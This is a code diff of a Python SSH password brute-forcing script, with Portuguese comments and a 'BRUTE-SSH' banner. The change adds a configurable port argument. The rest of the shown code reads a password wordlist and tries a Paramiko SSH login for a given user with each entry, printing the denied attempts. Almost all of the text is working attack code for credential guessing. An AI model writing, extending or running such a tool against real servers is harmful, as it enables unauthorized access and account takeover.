@@ -13,26 +13,27 @@ class bcolors:
     END = '\033[m'
 
 # Se a qtd de args for diferente de 4
-if len(sys.argv) != 4:
+if len(sys.argv) != 5:
     print (bcolors.RED + "\n ┏┓ ┏━┓╻ ╻╺┳╸┏━╸   ┏━┓┏━┓╻ ╻ " + bcolors.END)
     print (bcolors.RED + " ┣┻┓┣┳┛┃ ┃ ┃ ┣╸    ┗━┓┗━┓┣━┫ " + bcolors.END)
     print (bcolors.RED + " ┗━┛╹┗╸┗━┛ ╹ ┗━╸" + bcolors.END + bcolors.RED_BLINK + "╺━╸" + bcolors.END + bcolors.RED + "┗━┛┗━┛╹ ╹ " + bcolors.END)
     print (bcolors.BLUE + "\n [!] How to use:" + bcolors.END)
-    print (bcolors.GREEN + "     python3 " + sys.argv[0] + " 10.12.92.1 user passwords.txt" + bcolors.END)
+    print (bcolors.GREEN + "     python3 " + sys.argv[0] + " 10.12.92.1 22 user passwords.txt" + bcolors.END)
     sys.exit()
 
 # Salva os argumentos em variaveis
 alvo = sys.argv[1]
-usuario = sys.argv[2]
+porta = sys.argv[2]
+usuario = sys.argv[3]
 
 # Abre a lista do argumento de senhas
-f = codecs.open(sys.argv[3], 'r', encoding='utf-8', errors='ignore')
+f = codecs.open(sys.argv[4], 'r', encoding='utf-8', errors='ignore')
 
 # Exibe o banner e indica qual eh o alvo
 print (bcolors.RED + "\n ┏┓ ┏━┓╻ ╻╺┳╸┏━╸   ┏━┓┏━┓╻ ╻ " + bcolors.END)
 print (bcolors.RED + " ┣┻┓┣┳┛┃ ┃ ┃ ┣╸    ┗━┓┗━┓┣━┫ " + bcolors.END)
 print (bcolors.RED + " ┗━┛╹┗╸┗━┛ ╹ ┗━╸" + bcolors.END + bcolors.RED_BLINK + "╺━╸" + bcolors.END + bcolors.RED + "┗━┛┗━┛╹ ╹ " + bcolors.END)
-print (bcolors.YELLOW + "\n [*] Target %s:%s\n"%(alvo,"22") + bcolors.END)
+print (bcolors.YELLOW + "\n [*] Target %s:%s\n"%(alvo,str(porta)) + bcolors.END)
 
 # Laco de repeticao para testar as senhas
 for palavra in f.readlines():
@@ -46,7 +47,7 @@ for palavra in f.readlines():
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     # Tenta conectar no server
     try:
-        ssh.connect(str(alvo), username=str(usuario), password=str(senha), port='22')
+        ssh.connect(str(alvo), username=str(usuario), password=str(senha), port=str(porta))
     except paramiko.ssh_exception.AuthenticationException:
         print (bcolors.RED + " [!] Denied" + bcolors.END + " - User: %s | Password: %s"%(usuario,senha))
     else:
